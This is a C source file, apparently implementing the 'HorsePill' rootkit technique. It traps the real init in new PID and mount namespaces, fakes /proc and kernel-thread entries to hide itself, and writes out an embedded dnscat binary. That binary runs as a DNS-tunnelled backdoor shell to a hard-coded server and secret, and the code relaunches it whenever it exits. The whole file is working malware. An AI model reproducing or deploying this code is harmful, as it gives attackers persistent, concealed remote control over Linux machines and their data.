#define _GNU_SOURCE
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/reboot.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "dnscat.h"
#include "horsepill.h"

#ifndef __NR_clone3
#define __NR_clone3 -1
#endif

#ifndef MS_RELATIME
#define MS_RELATIME     (1<<21)
#endif
#ifndef MS_STRICTATIME
#define MS_STRICTATIME  (1<<24)
#endif
#ifndef MS_SLAVE
#define MS_SLAVE	(1<<19)
#endif
#ifndef CLONE_NEWNS
#define CLONE_NEWNS     0x00020000
#endif
#ifndef CLONE_NEWPID
#define CLONE_NEWPID    0x20000000
#endif

#define err_exit(msg)                   \
        do {                            \
                perror(msg);            \
                exit(EXIT_FAILURE);     \
        } while (0)

#define G3LBIN(x) (void)x
#define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))

#define DNSCAT_PATH "/lost+found/dnscat"

static char *const ARGV0 = "dnscat\0";
static char *const ARGV1 = "--dns\0";
static char *const ARGV2 = "server=192.168.1.197,port=53\0";
static char *const ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";

static pid_t init_pid;
char **cmdline_ptr;

extern pid_t __clone(int, void *);

static inline int raw_clone(unsigned long flags, void *child_stack) {
        return __clone(flags, child_stack);
}

static void set_process_name(char *name)
{
        char buf[2048];

        memset((void*)buf, 0, sizeof(buf));
        strncpy(buf, name + 1, strlen(name) - 2);
        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
                printf("prctl set name returned error!\n");
                exit(EXIT_FAILURE);
        }
        memset((void *)cmdline_ptr[0], 0, 32);
        strcpy(cmdline_ptr[0], name);
}

static void make_fake_kthreads(char **threads)
{
        int i;
        sigset_t set;

        if (fork() == 0) {
                /* special case for pid 2 (kthreadd) */

                /* block all signals which can terminate
                 * the fake kernel threads
                 */
                G3LBIN(sigfillset(&set));
                G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));

                set_process_name(threads[0]);
                for (i = 1; threads[i]; i++) {
                        if (fork() == 0) {
                                /* all other kernel threads are
                                 * children of pid 2
                                 */
                                set_process_name(threads[i]);
                                while(1) {
                                        pause();
                                }
                                exit(EXIT_FAILURE); /* should never
                                                     * reach here */
                        }
                }
                while(1) {
                        pause();
                }
                exit(EXIT_FAILURE); /* should never reach here */
        }
}

static int is_proc(char *name)
{
        int i;
        for (i = 0; i < strlen(name); i++) {
                if (!isdigit(name[i]))
                        return 0;
        }
        return 1;
}

static char *grab_kernel_thread(char *name)
{
        FILE *stat;
        char buf[4096];

        int pid;
        char pidname[4096];
        char newpidname[4096];
        char state;
        int ppid;

        char *ret = NULL;

        memset((void*)newpidname, 0, sizeof(newpidname));
        snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
        stat = fopen(buf, "r");
        if (stat == NULL) {
                printf("couldn't open /proc/%s/stat\n", name);
                goto out;
        }
        fgets(buf, sizeof(buf) - 1, stat);
        sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
        if (pid != 1 && (ppid == 0 || ppid == 2)) {
                for (unsigned int i = 0; i <= strlen(pidname); i++) {
                        char c = pidname[i];
                        if (c == '(') {
                                c = '[';
                        } else if (c == ')') {
                                c = ']';
                        }
                        newpidname[i] = c;
                }
                ret = strdup(newpidname);
        }
        fclose(stat);
out:
        return ret;
}

/**
 * enumerate_kernel_threads - enumerates the kernel threads
 * @threads: array of kernel thread names
 * 
 * To obtain the names of the active threads, the
 * directories inside '/ proc' are inspected which have
 * the name coinciding with the PIDs of the active processes.
 * 
 * Returns the number of kernel threads found.
 */
static int enumerate_kernel_threads(char **threads)
{
        DIR *dirp;
        int i = 0;
        struct dirent *dp;

        if ((dirp = opendir("/proc")) == NULL)
                err_exit("couldn't open '/proc'");

        do {
                errno = 0;
                if ((dp = readdir(dirp)) != NULL) {
                        if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
                                char *name = grab_kernel_thread(dp->d_name);
                                if (name) {
                                        threads[i] = name;
                                        i++;
                                }
                        }
                }
        } while (dp != NULL);

        if (errno != 0)
                err_exit("error reading directory");
        G3LBIN(closedir(dirp));
        return i;
}

static void on_sigint(int signum)
{
        if (signum == SIGINT)
                kill(init_pid, SIGINT);
}

static void handle_init_exit(int wstatus)
{
        char msg[128];

        if (WIFSIGNALED(wstatus)) {
                int signum = WTERMSIG(wstatus);

                if (signum == SIGHUP) {
                        /* The system must be restarted */
                        G3LBIN(reboot(LINUX_REBOOT_CMD_RESTART, NULL));
                        snprintf(msg, 14, "cannot reboot");
                } else if (signum == SIGINT) {
                        /* The system must be turned off */
                        G3LBIN(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
                        snprintf(msg, 16, "cannot shutdown");
                } else {
                        snprintf(msg, 47,
                                 "init exited via signal %d for unknown reason...",
                                 signum);
                }
        } else {
                snprintf(msg, 48,
                         "init exited with status %d for unknown reason...",
                         WEXITSTATUS(wstatus));
        }
        err_exit(msg);
}

void write_dnscat_exe()
{
        FILE* file = NULL;
	file = fopen(DNSCAT_PATH, "w+");
	if (file) {
		(void)fwrite((const void *)dnscat, 1, dnscat_len, file);
		(void)fclose(file);
		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
	}
}

static pid_t run_dnscat_client()
{
	pid_t pid;

	pid = fork();
	if (pid < 0) {
		printf("couldn't fork!\n");
		exit(EXIT_FAILURE);
	} else if (pid == 0) {
		/* child */
		char *const argv[5] = {
                        ARGV0,
                        ARGV1,
                        ARGV2,
                        ARGV3,
                        NULL
                };

		close(0);
		close(1);
		close(2);

		G3LBIN(open("/dev/null", O_RDONLY));
		G3LBIN(open("/dev/null", O_WRONLY));
		G3LBIN(open("/dev/null", O_RDWR));

		execv(DNSCAT_PATH, argv);

		err_exit("couldn't run dnscat!");
	}
	return pid;
}

void do_attack()
{       
        init_pid = raw_clone(CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
        if (init_pid < 0) {
                err_exit("clone");
        } else if (init_pid == 0) {
                /* Child process which works within the containerized system */
                int mountflags;
                char *kthreads_names[1024];
                G3LBIN(enumerate_kernel_threads(kthreads_names));

                mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
                if (mount("none", "/proc", "", MS_REC | MS_SLAVE, NULL) < 0)
                        err_exit("Cannot remount '/proc'");
                if (mount("proc", "/proc", "proc", mountflags, NULL) < 0)
                        err_exit("Cannot remount '/proc'");

                make_fake_kthreads(kthreads_names);
                sleep(5);	/* wait for completion */
        } else {
                /* Parent process */
                int wstatus;
                pid_t pid;
                pid_t dnscat_pid;

                /* plop a ramdisk over lost+found for our use */
		if (mount("tmpfs", "/lost+found", "tmpfs", MS_PRIVATE | MS_STRICTATIME, "mode=755") < 0)
                        err_exit("couldn't mount ramdisk!");

                /* install signal handler to handle signal delivered
                 * ctrl-alt-delete, which we will send to child init
                 */
                if (signal(SIGINT, on_sigint) == SIG_ERR)
                        err_exit("couldn't install signal handler");
                if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0)
                        err_exit("couldn't turn cad off");

                /* wait for things to come up and networking to be
		 * ready
		 */
		sleep(20);

		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
			  "errors=remount-ro,data=ordered") < 0)
                        err_exit("couldn't remount /");

                /* spawn a process for backdoor shell */
		write_dnscat_exe();
		dnscat_pid = run_dnscat_client();

                /* watching for dnscat exit
                 * also, watching for reinfection
                 * also, waitpid for init
                 */
                while(1) {
                        pid = waitpid(-1, &wstatus, 0);
                        if (pid < 0) {
                                if (errno != EINTR) {
                                        err_exit("watipid returned error!");
                                } else {
                                        /* interrupted via signal */
                                        continue;
                                }
                        } else if (pid == init_pid) {
                                handle_init_exit(wstatus);
                        } else if (pid == dnscat_pid) {
                         	dnscat_pid = run_dnscat_client();
                        } else {
                                printf("unknown other pid %d exited\n", pid);
                        }
                        sleep(1);
                }
        }
}

